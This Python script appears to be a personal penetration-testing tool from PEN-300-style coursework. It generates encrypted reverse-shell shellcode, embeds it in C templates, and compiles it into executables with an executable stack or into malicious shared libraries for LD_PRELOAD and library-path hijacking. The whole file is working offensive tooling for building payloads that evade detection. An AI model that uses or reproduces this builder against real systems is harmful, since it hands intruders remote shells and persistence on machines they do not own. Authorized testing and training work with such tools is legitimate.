#!/usr/bin/python3

import os
import subprocess
from lib.functions import get_payload, generate_command
from lib.shellcode import encrypt_shellcode
from temps.c_templates import templates_dict


def main(args):
    base_path = "/home/tijmen/pen300/genpayload/output"

    if args.conn == "secure":
        conn = "tcp"
    else:
        conn = args.conn

    payload = get_payload(args.format, args.arch, conn)
    command = generate_command(payload, args)

    shellcode = generate_shellcode(command, args.format)
    if not shellcode:
        print("Shellcode not generate")
        quit()

    filepath = generate_payload(args, command, shellcode, base_path)

    build_clang(filepath, base_path, args.template, args.name)


def generate_shellcode(command, format):
    try:
        encrypted_shellcode = encrypt_shellcode(command, format)
        c_style = []
        for hex in encrypted_shellcode:
            c_style.append(hex.replace("0x", "\\x"))
        buf = f'unsigned char buf[] = "{''.join(c_style)}";'
        return buf
    except subprocess.CalledProcessError as e:
        print(f"An error occurred while executing the command: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        quit()


def generate_payload(args, command, shellcode, base_path):
    try:
        template = templates_dict[args.template]
    except Exception as e:
        raise ValueError("Unsupported format for template")
        quit()
    try:
        if args.template in ["so-libpath", "so-preload"]:
            template = template.replace("FILENAME", args.name)
        command_added = template.replace("MSFVENOM", " ".join(command))
        final_output = command_added.replace("SHELLCODE", shellcode)

        if args.template == "elf":
            output_path = f"{base_path}/elf-revshell.c"
        elif args.template in ["so-libpath", "so-preload"]:
            output_path = f"{base_path}/so-revshell.c"
        if os.path.exists(output_path):
            os.remove(output_path)
        with open(output_path, "w+") as file_obj:
            file_obj.write(final_output)

        print(f"See '{output_path}' for your shell\n")

        return output_path
    except Exception as e:
        print(f"Error creating the template: {e}")
        quit()


def build_clang(filepath, base_path, template, name):
    try:
        if template == "elf":
            subprocess.run([
                "docker", "run", "--rm",
                "-v", f"{base_path}:/usr/src/myapp",
                "-w", "/usr/src/myapp",
                "gcc:4.9",
                "gcc", "-z", "execstack", "-o", f"li-rshell.elf", f"elf-revshell.c", "-std=c11"
            ], check=True)
            # subprocess.run(
            #     ["/usr/bin/gcc", "-z", "execstack", "-o", f"{base_path}/li-rshell.elf", filepath], check=True
            # )
            print(f"Compiled at {base_path}/li-rshell.elf")
        elif template == "so-libpath":
            subprocess.run(
                ["/usr/bin/gcc", "-Wall", "-fPIC", "-c", "-o", "hax.o", filepath],
                check=True,
            )
            subprocess.run(
                ["/usr/bin/gcc", "-shared", "-o", f"{base_path}/li-rshell.so", "hax.o"],
                check=True,
            )
            print(f"Compiled at {base_path}/li-rshell.so")
            # os.system(f'/usr/bin/gcc -Wall -fPIC -c -o {base_path}/hax.o {filepath} ')
            # os.system(f'/usr/bin/gcc -shared -Wl,--version-script gpg.map -o {base_path}/libgpg-error.so.0 {base_path}/hax.o')
        elif template == "so-preload":
            subprocess.run(
                [
                    "/usr/bin/gcc",
                    "-Wall",
                    "-fPIC",
                    "-z",
                    "execstack",
                    "-c",
                    "-o",
                    f"{base_path}/evil_{name}.o",
                    filepath,
                ],
                check=True,
            )
            subprocess.run(
                [
                    "/usr/bin/gcc",
                    "-shared",
                    "-ldl",
                    "-o",
                    f"{base_path}/evil_{name}.so",
                    f"{base_path}/evil_{name}.o",
                ],
                check=True,
            )
            print(f"Compiled at {base_path}/evil_{name}.so")
    except subprocess.CalledProcessError as e:
        print(f"[!] Compilation failed: {e}")
